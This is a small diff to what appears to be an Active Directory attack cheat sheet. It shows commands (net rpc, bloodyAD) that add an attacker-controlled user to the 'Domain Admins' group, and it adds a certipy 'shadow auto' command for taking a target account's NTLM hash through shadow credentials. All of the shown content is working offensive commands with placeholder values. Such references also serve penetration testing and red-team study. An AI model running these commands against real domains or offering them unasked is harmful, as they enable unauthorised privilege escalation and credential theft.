@@ -63,8 +63,11 @@ net rpc group addmem "Domain Admins" "<Target_User>" -U '<domain>'/'<controlled_
 
 
 # BloodyAD method
-
+# Add user to group
 bloodyAD --host "<dc_ip>" -d "<domain>" -u "<controlled_user>" -p "<password>" add groupMember "Domain Admins" "<user>"
+# Get NTLM of user in group
+certipy shadow auto -u <user_we_control>@<domain> -p <pass> -account <target_acct>
+
 
 
 # net group method (windows)
